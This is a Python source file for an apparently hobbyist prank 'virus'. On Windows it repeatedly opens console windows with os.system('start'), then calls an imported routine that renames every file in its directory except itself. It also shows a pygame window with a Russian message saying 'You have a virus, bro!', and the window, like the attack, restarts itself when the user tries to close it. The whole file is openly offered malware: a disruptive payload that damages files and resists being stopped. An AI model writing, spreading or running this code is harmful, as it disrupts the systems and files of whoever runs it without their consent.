import os
import sys
from pathlib import Path
import time
import pygame
from Basics.rename_test.virus_rename import rename_all_files_in_dir, CURRENT_FILE as RENAME_EX_FILE
from tkinter import messagebox




class VirusExecutor(object):
    def __init__(self, attacks_amount: int = 30):
        self.current_attacks_amount = 0
        self.max_attacks_amount = attacks_amount

    def execute(self):
        while self.if_attack_needs_to_be_stopped():
            self.current_attacks_amount += 1
            self.attack()
        self.finish()

    def if_attack_needs_to_be_stopped(self) -> bool:
        return self.current_attacks_amount != self.max_attacks_amount

    def attack(self):
        raise NotImplementedError

    @staticmethod
    def finish():
        rename_all_files_in_dir(protected_files=frozenset((RENAME_EX_FILE, Path(__file__))))


class WindowsVirusExecutor(VirusExecutor):
    def attack(self):
        os.system("start")


class MacOSVirusExecutor(VirusExecutor):
    def attack(self):
        print("ATTACK!")


if __name__ == "__main__":
    if sys.platform.startswith('win'):
        WindowsVirusExecutor(5).execute()
        pygame.init()
        while True:
            for i in pygame.event.get():
                if i.type == pygame.QUIT:
                    pygame.quit()
                    time.sleep(0.001)
                    WindowsVirusExecutor(5).execute()

    else:
        MacOSVirusExecutor(5).execute()

pygame.init() #инициализация pygame#
screen = pygame.display.set_mode ((1000, 500)) #открытие окна#
pygame.display.set_caption('ВНИМАНИЕ') # надпись в заголовке #
font = pygame.font.SysFont('Segoe UI', 50) # характеристики надписи в самом окне #
label = font.render('У тебя вирус, бро!', 1, (12, 140, 0, 1)) # надпись в самом окне #

while True:
     for i in pygame.event.get():
        if i.type == pygame.QUIT:
            pygame.quit()
            time.sleep(0.001)
            screen = pygame.display.set_mode((1000, 500))  # открытие окна#
            pygame.display.set_caption('ВНИМАНИЕ')

     try:
         screen.fill ((0, 0, 0)) #цвет экрана#
         screen.blit (label, (50, 50)) #выведение на экран#
         pygame.display.update() #обновление экрана#
     except KeyboardInterrupt:
         break

